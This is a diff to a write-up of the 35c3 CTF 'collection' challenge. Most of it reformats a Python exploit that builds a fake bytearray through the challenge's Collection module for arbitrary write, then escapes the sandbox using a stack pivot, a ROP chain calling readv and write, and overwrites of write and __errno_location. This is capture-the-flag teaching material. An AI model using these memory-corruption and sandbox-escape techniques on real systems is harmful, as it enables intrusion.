@@ -8,7 +8,6 @@ tags: [writeup,reversing,pwn]
 - [35c3 collection write up](#org28f36eb)
   - [Getting Arbitrary Read Write Primitive](#org304b5f3)
   - [Getting Code Execution](#org7c6608c)
-  - [Reference](#org7d66a47)
 
 
 <a id="org28f36eb"></a>
@@ -363,294 +362,107 @@ After we achieve stack pivot we just need to create a rop chain to call readv(10
 ```python
 import Collection
 
-alp = {'00': b'\x00',
- '01': b'\x01',
- '02': b'\x02',
- '03': b'\x03',
- '04': b'\x04',
- '05': b'\x05',
- '06': b'\x06',
- '07': b'\x07',
- '08': b'\x08',
- '09': b'\t',
- '0a': b'\n',
- '0b': b'\x0b',
- '0c': b'\x0c',
- '0d': b'\r',
- '0e': b'\x0e',
- '0f': b'\x0f',
- '10': b'\x10',
- '11': b'\x11',
- '12': b'\x12',
- '13': b'\x13',
- '14': b'\x14',
- '15': b'\x15',
- '16': b'\x16',
- '17': b'\x17',
- '18': b'\x18',
- '19': b'\x19',
- '1a': b'\x1a',
- '1b': b'\x1b',
- '1c': b'\x1c',
- '1d': b'\x1d',
- '1e': b'\x1e',
- '1f': b'\x1f',
- '20': b' ',
- '21': b'!',
- '22': b'"',
- '23': b'#',
- '24': b'$',
- '25': b'%',
- '26': b'&',
- '27': b"'",
- '28': b'(',
- '29': b')',
- '2a': b'*',
- '2b': b'+',
- '2c': b',',
- '2d': b'-',
- '2e': b'.',
- '2f': b'/',
- '30': b'0',
- '31': b'1',
- '32': b'2',
- '33': b'3',
- '34': b'4',
- '35': b'5',
- '36': b'6',
- '37': b'7',
- '38': b'8',
- '39': b'9',
- '3a': b':',
- '3b': b';',
- '3c': b'<',
- '3d': b'=',
- '3e': b'>',
- '3f': b'?',
- '40': b'@',
- '41': b'A',
- '42': b'B',
- '43': b'C',
- '44': b'D',
- '45': b'E',
- '46': b'F',
- '47': b'G',
- '48': b'H',
- '49': b'I',
- '4a': b'J',
- '4b': b'K',
- '4c': b'L',
- '4d': b'M',
- '4e': b'N',
- '4f': b'O',
- '50': b'P',
- '51': b'Q',
- '52': b'R',
- '53': b'S',
- '54': b'T',
- '55': b'U',
- '56': b'V',
- '57': b'W',
- '58': b'X',
- '59': b'Y',
- '5a': b'Z',
- '5b': b'[',
- '5c': b'\\',
- '5d': b']',
- '5e': b'^',
- '5f': b'_',
- '60': b'`',
- '61': b'a',
- '62': b'b',
- '63': b'c',
- '64': b'd',
- '65': b'e',
- '66': b'f',
- '67': b'g',
- '68': b'h',
- '69': b'i',
- '6a': b'j',
- '6b': b'k',
- '6c': b'l',
- '6d': b'm',
- '6e': b'n',
- '6f': b'o',
- '70': b'p',
- '71': b'q',
- '72': b'r',
- '73': b's',
- '74': b't',
- '75': b'u',
- '76': b'v',
- '77': b'w',
- '78': b'x',
- '79': b'y',
- '7a': b'z',
- '7b': b'{',
- '7c': b'|',
- '7d': b'}',
- '7e': b'~',
- '7f': b'\x7f',
- '80': b'\x80',
- '81': b'\x81',
- '82': b'\x82',
- '83': b'\x83',
- '84': b'\x84',
- '85': b'\x85',
- '86': b'\x86',
- '87': b'\x87',
- '88': b'\x88',
- '89': b'\x89',
- '8a': b'\x8a',
- '8b': b'\x8b',
- '8c': b'\x8c',
- '8d': b'\x8d',
- '8e': b'\x8e',
- '8f': b'\x8f',
- '90': b'\x90',
- '91': b'\x91',
- '92': b'\x92',
- '93': b'\x93',
- '94': b'\x94',
- '95': b'\x95',
- '96': b'\x96',
- '97': b'\x97',
- '98': b'\x98',
- '99': b'\x99',
- '9a': b'\x9a',
- '9b': b'\x9b',
- '9c': b'\x9c',
- '9d': b'\x9d',
- '9e': b'\x9e',
- '9f': b'\x9f',
- 'a0': b'\xa0',
- 'a1': b'\xa1',
- 'a2': b'\xa2',
- 'a3': b'\xa3',
- 'a4': b'\xa4',
- 'a5': b'\xa5',
- 'a6': b'\xa6',
- 'a7': b'\xa7',
- 'a8': b'\xa8',
- 'a9': b'\xa9',
- 'aa': b'\xaa',
- 'ab': b'\xab',
- 'ac': b'\xac',
- 'ad': b'\xad',
- 'ae': b'\xae',
- 'af': b'\xaf',
- 'b0': b'\xb0',
- 'b1': b'\xb1',
- 'b2': b'\xb2',
- 'b3': b'\xb3',
- 'b4': b'\xb4',
- 'b5': b'\xb5',
- 'b6': b'\xb6',
- 'b7': b'\xb7',
- 'b8': b'\xb8',
- 'b9': b'\xb9',
- 'ba': b'\xba',
- 'bb': b'\xbb',
- 'bc': b'\xbc',
- 'bd': b'\xbd',
- 'be': b'\xbe',
- 'bf': b'\xbf',
- 'c0': b'\xc0',
- 'c1': b'\xc1',
- 'c2': b'\xc2',
- 'c3': b'\xc3',
- 'c4': b'\xc4',
- 'c5': b'\xc5',
- 'c6': b'\xc6',
- 'c7': b'\xc7',
- 'c8': b'\xc8',
- 'c9': b'\xc9',
- 'ca': b'\xca',
- 'cb': b'\xcb',
- 'cc': b'\xcc',
- 'cd': b'\xcd',
- 'ce': b'\xce',
- 'cf': b'\xcf',
- 'd0': b'\xd0',
- 'd1': b'\xd1',
- 'd2': b'\xd2',
- 'd3': b'\xd3',
- 'd4': b'\xd4',
- 'd5': b'\xd5',
- 'd6': b'\xd6',
- 'd7': b'\xd7',
- 'd8': b'\xd8',
- 'd9': b'\xd9',
- 'da': b'\xda',
- 'db': b'\xdb',
- 'dc': b'\xdc',
- 'dd': b'\xdd',
- 'de': b'\xde',
- 'df': b'\xdf',
- 'e0': b'\xe0',
- 'e1': b'\xe1',
- 'e2': b'\xe2',
- 'e3': b'\xe3',
- 'e4': b'\xe4',
- 'e5': b'\xe5',
- 'e6': b'\xe6',
- 'e7': b'\xe7',
- 'e8': b'\xe8',
- 'e9': b'\xe9',
- 'ea': b'\xea',
- 'eb': b'\xeb',
- 'ec': b'\xec',
- 'ed': b'\xed',
- 'ee': b'\xee',
- 'ef': b'\xef',
- 'f0': b'\xf0',
- 'f1': b'\xf1',
- 'f2': b'\xf2',
- 'f3': b'\xf3',
- 'f4': b'\xf4',
- 'f5': b'\xf5',
- 'f6': b'\xf6',
- 'f7': b'\xf7',
- 'f8': b'\xf8',
- 'f9': b'\xf9',
- 'fa': b'\xfa',
- 'fb': b'\xfb',
- 'fc': b'\xfc',
- 'fd': b'\xfd',
- 'fe': b'\xfe',
- 'ff': b'\xff'}
+alp = {
+    '00': b'\x00','01': b'\x01','02': b'\x02','03': b'\x03',
+    '04': b'\x04','05': b'\x05','06': b'\x06','07': b'\x07',
+    '08': b'\x08','09': b'\t','0a': b'\n','0b': b'\x0b',
+    '0c': b'\x0c','0d': b'\r','0e': b'\x0e','0f': b'\x0f',
+    '10': b'\x10','11': b'\x11','12': b'\x12','13': b'\x13',
+    '14': b'\x14','15': b'\x15','16': b'\x16','17': b'\x17',
+    '18': b'\x18','19': b'\x19','1a': b'\x1a','1b': b'\x1b',
+    '1c': b'\x1c','1d': b'\x1d','1e': b'\x1e','1f': b'\x1f',
+    '20': b' ','21': b'!','22': b'"','23': b'#',
+    '24': b'$','25': b'%','26': b'&','27': b"'",
+    '28': b'(','29': b')','2a': b'*','2b': b'+',
+    '2c': b',','2d': b'-','2e': b'.','2f': b'/',
+    '30': b'0','31': b'1','32': b'2','33': b'3',
+    '34': b'4','35': b'5','36': b'6','37': b'7',
+    '38': b'8','39': b'9','3a': b':','3b': b';',
+    '3c': b'<','3d': b'=','3e': b'>','3f': b'?',
+    '40': b'@','41': b'A','42': b'B','43': b'C',
+    '44': b'D','45': b'E','46': b'F','47': b'G',
+    '48': b'H','49': b'I','4a': b'J','4b': b'K',
+    '4c': b'L','4d': b'M','4e': b'N','4f': b'O',
+    '50': b'P','51': b'Q','52': b'R','53': b'S',
+    '54': b'T','55': b'U','56': b'V','57': b'W',
+    '58': b'X','59': b'Y','5a': b'Z','5b': b'[',
+    '5c': b'\\','5d': b']','5e': b'^','5f': b'_',
+    '60': b'`','61': b'a','62': b'b','63': b'c',
+    '64': b'd','65': b'e','66': b'f','67': b'g',
+    '68': b'h','69': b'i','6a': b'j','6b': b'k',
+    '6c': b'l','6d': b'm','6e': b'n','6f': b'o',
+    '70': b'p','71': b'q','72': b'r','73': b's',
+    '74': b't','75': b'u','76': b'v','77': b'w',
+    '78': b'x','79': b'y','7a': b'z','7b': b'{',
+    '7c': b'|','7d': b'}','7e': b'~','7f': b'\x7f',
+    '80': b'\x80','81': b'\x81','82': b'\x82','83': b'\x83',
+    '84': b'\x84','85': b'\x85','86': b'\x86','87': b'\x87',
+    '88': b'\x88','89': b'\x89','8a': b'\x8a','8b': b'\x8b',
+    '8c': b'\x8c','8d': b'\x8d','8e': b'\x8e','8f': b'\x8f',
+    '90': b'\x90','91': b'\x91','92': b'\x92','93': b'\x93',
+    '94': b'\x94','95': b'\x95','96': b'\x96','97': b'\x97',
+    '98': b'\x98','99': b'\x99','9a': b'\x9a','9b': b'\x9b',
+    '9c': b'\x9c','9d': b'\x9d','9e': b'\x9e','9f': b'\x9f',
+    'a0': b'\xa0','a1': b'\xa1','a2': b'\xa2','a3': b'\xa3',
+    'a4': b'\xa4','a5': b'\xa5','a6': b'\xa6','a7': b'\xa7',
+    'a8': b'\xa8','a9': b'\xa9','aa': b'\xaa','ab': b'\xab',
+    'ac': b'\xac','ad': b'\xad','ae': b'\xae','af': b'\xaf',
+    'b0': b'\xb0','b1': b'\xb1','b2': b'\xb2','b3': b'\xb3',
+    'b4': b'\xb4','b5': b'\xb5','b6': b'\xb6','b7': b'\xb7',
+    'b8': b'\xb8','b9': b'\xb9','ba': b'\xba','bb': b'\xbb',
+    'bc': b'\xbc','bd': b'\xbd','be': b'\xbe','bf': b'\xbf',
+    'c0': b'\xc0','c1': b'\xc1','c2': b'\xc2','c3': b'\xc3',
+    'c4': b'\xc4','c5': b'\xc5','c6': b'\xc6','c7': b'\xc7',
+    'c8': b'\xc8','c9': b'\xc9','ca': b'\xca','cb': b'\xcb',
+    'cc': b'\xcc','cd': b'\xcd','ce': b'\xce','cf': b'\xcf',
+    'd0': b'\xd0','d1': b'\xd1','d2': b'\xd2','d3': b'\xd3',
+    'd4': b'\xd4','d5': b'\xd5','d6': b'\xd6','d7': b'\xd7',
+    'd8': b'\xd8','d9': b'\xd9','da': b'\xda','db': b'\xdb',
+    'dc': b'\xdc','dd': b'\xdd','de': b'\xde','df': b'\xdf',
+    'e0': b'\xe0','e1': b'\xe1','e2': b'\xe2','e3': b'\xe3',
+    'e4': b'\xe4','e5': b'\xe5','e6': b'\xe6','e7': b'\xe7',
+    'e8': b'\xe8','e9': b'\xe9','ea': b'\xea','eb': b'\xeb',
+    'ec': b'\xec','ed': b'\xed','ee': b'\xee','ef': b'\xef',
+    'f0': b'\xf0','f1': b'\xf1','f2': b'\xf2','f3': b'\xf3',
+    'f4': b'\xf4','f5': b'\xf5','f6': b'\xf6','f7': b'\xf7',
+    'f8': b'\xf8','f9': b'\xf9','fa': b'\xfa','fb': b'\xfb',
+    'fc': b'\xfc','fd': b'\xfd','fe': b'\xfe','ff': b'\xff'
+}
+
 
 def p64(a):
-    a=hex(a)[2:].rjust(16,'0')
-    li = [a[i:i+2] for i in range(0,16,2)]
-    st=b''
+    a = hex(a)[2:].rjust(16, '0')
+    li = [a[i:i + 2] for i in range(0, 16, 2)]
+    st = b''
     for i in li:
-        st+=alp[i]
+        st += alp[i]
     return st[::-1]
 
-def fake_bytearray(addr,size):
 
-    payload =  p64(0xffff)
+def fake_bytearray(addr, size):
+
+    payload = p64(0xffff)
     payload += p64(0x00000000009ce7e0)
     payload += p64(size)
-    payload += p64(size+1)
+    payload += p64(size + 1)
     payload += p64(addr)
     payload += p64(addr)
     payload += p64(0x0)
     return payload
 
-def write(addr,inp):
-    payload = fake_bytearray(addr,len(inp))
-    payload_addr  = id(payload)
-    a = Collection.Collection({"A":1337,"B":[1]})
-    b = Collection.Collection({"B":[1],"A":payload_addr + 0x20})
+
+def write(addr, inp):
+    payload = fake_bytearray(addr, len(inp))
+    payload_addr = id(payload)
+    a = Collection.Collection({"A": 1337, "B": [1]})
+    b = Collection.Collection({"B": [1], "A": payload_addr + 0x20})
     c = b.get("B")
     for i in range(len(inp)):
-        c[i]=inp[i]
+        c[i] = inp[i]
 
 
 target = "\x00" * 0x100
-iov=p64(id(target)+0x30)+p64(0x100)
+iov = p64(id(target) + 0x30) + p64(0x100)
 
 pop_rdi = 0x00421612
 pop_rsi = 0x0042110e
@@ -658,53 +470,51 @@ pop_rdx = 0x004026c1
 pop_rax = 0x00631caf
 
 readv_plt = 0x4208b0
-syscall   = 0x0049d6d4
+syscall = 0x0049d6d4
 
-read_payload  = p64(pop_rdi)
+read_payload = p64(pop_rdi)
 read_payload += p64(1023)
 read_payload += p64(pop_rsi)
-read_payload += p64(id(iov)+0x20)
+read_payload += p64(id(iov) + 0x20)
 read_payload += p64(pop_rdx)
 read_payload += p64(0x1)
 read_payload += p64(readv_plt)
 
-write_payload  = p64(pop_rdi)
+write_payload = p64(pop_rdi)
 write_payload += p64(1)
 write_payload += p64(pop_rsi)
-write_payload += p64(id(target)+0x30)
+write_payload += p64(id(target) + 0x30)
 write_payload += p64(pop_rdx)
 write_payload += p64(50)
 write_payload += p64(pop_rax)
 write_payload += p64(1)
 write_payload += p64(syscall)
 
-rop  = read_payload
+rop = read_payload
 rop += write_payload
 
-
 stack_pviot = 0xa42f30
-write(stack_pviot,rop)
+write(stack_pviot, rop)
 
 # 0x0000000000467123 : leave ; ret
-leave_ret = 0x00467123 
+leave_ret = 0x00467123
 write_plt = 0x009b3d18
 
-write(write_plt,p64(leave_ret))
+write(write_plt, p64(leave_ret))
 
 # 0x000000000061233e: mov rax, rcx; ret;
-mov_rax_rcx = 0x0061233e 
+mov_rax_rcx = 0x0061233e
 __errno_location = 0x009b3950
 
-write(__errno_location,p64(mov_rax_rcx))
+write(__errno_location, p64(mov_rax_rcx))
 
 print("A" * (stack_pviot - 8))
 ```
 
 
-<a id="org7d66a47"></a>
 
-## Reference
+Reference :
 
-[ 1 ] [python-sandbox-escape-via-a-memory-corruption-bug](https://hackernoon.com/python-sandbox-escape-via-a-memory-corruption-bug-19dde4d5fea5)
+* [python-sandbox-escape-via-a-memory-corruption-bug](https://hackernoon.com/python-sandbox-escape-via-a-memory-corruption-bug-19dde4d5fea5)
 
-[ 2 ] [Extending Python with C or C++](https://docs.python.org/3/extending/extending.html)
+* [Extending Python with C or C++](https://docs.python.org/3/extending/extending.html)
